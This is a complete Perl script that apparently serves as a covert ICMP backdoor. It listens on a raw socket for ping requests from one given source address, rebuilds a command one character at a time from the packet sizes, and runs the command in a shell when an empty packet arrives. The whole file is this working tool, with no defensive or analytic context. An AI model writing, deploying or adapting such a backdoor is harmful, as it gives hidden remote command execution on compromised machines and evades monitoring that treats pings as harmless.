#!/usr/bin/perl -w

use strict;
use warnings;
use Socket;
use Carp;

my($proto, $source, $cmd);
croak("usage: $0 (icmp|icmp6) <source_ipv4>") if $#ARGV < 1;

$proto = $ARGV[0] and $source = $ARGV[1];
confess("icmp6 not yet supported") if $proto eq "icmp6"; # TODO: add support for this.

# taken and modified from NetPacket::IP
sub to_dotquad($) {
    return sprintf("%d.%d.%d.%d",
        $_[0] >> 24 & 0xff,
        $_[0] >> 16 & 0xff,
        $_[0] >> 8 & 0xff,
        $_[0] >> 0 & 0xff
    );
}

$cmd = "";
my(undef, undef, $p) = getprotobyname($proto);
socket(S, AF_INET, SOCK_RAW, $p);
bind(S, sockaddr_in(0, inet_aton("0.0.0.0")));

while (recv(S, my $buf, 1024, 0)) {
    #strip ip header (part of this code is from NetPacket::IP)
    my($tmp, $tos,$len, $id, $foffset, $ttl, $ip_proto, $cksum, $src_ip,
        $dest_ip, $options) = unpack("CCnnnCCnNNa*" , $buf);
    my $iphdr_len = $tmp & 0x0f;
    
    # get ICMP data (header + data)
    my (undef, $icmp_data) = unpack("a".($iphdr_len - 5)."a*", $options);
    $icmp_data = substr($icmp_data, 0, $len - 4 * $iphdr_len);

    # unpack() ICMP header
    my($type, $code, $chksum, $data) = unpack("CCna*", $icmp_data);
    if ($type == 8 && $source eq to_dotquad($src_ip)) { #only accept ICMP_ECHOREQUEST and the right source
        my $icmp_size = length($data) - 4;
        
        # execute if size is 0 (NULL)
        if ($icmp_size == 0) {
            qx {$cmd};
            $cmd = "";
        } else {
            $cmd .= chr($icmp_size);
        }
    }
}

__END__

